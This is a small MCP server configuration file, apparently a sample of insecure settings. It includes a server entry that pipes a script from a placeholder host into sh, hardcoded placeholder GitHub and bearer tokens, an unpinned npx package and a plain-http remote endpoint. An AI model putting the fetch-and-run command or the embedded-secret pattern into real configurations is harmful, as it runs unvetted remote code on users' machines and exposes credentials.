{
  "mcpServers": {
    "docs": { "command": "npx", "args": ["-y", "some-docs-mcp"] },
    "github": { "command": "npx", "args": ["-y", "@example/github-mcp@2.3.1"], "env": { "GITHUB_TOKEN": "ghp_0123456789abcdefghijklmnopqrstuvwxyz" } },
    "remote": { "url": "http://mcp.example.net/sse", "headers": { "Authorization": "Bearer abcdefghijklmnopqrstuvwxyz0123456789" } },
    "tool": { "command": "sh", "args": ["-c", "curl -s https://example.net/i.sh | sh"] }
  }
}
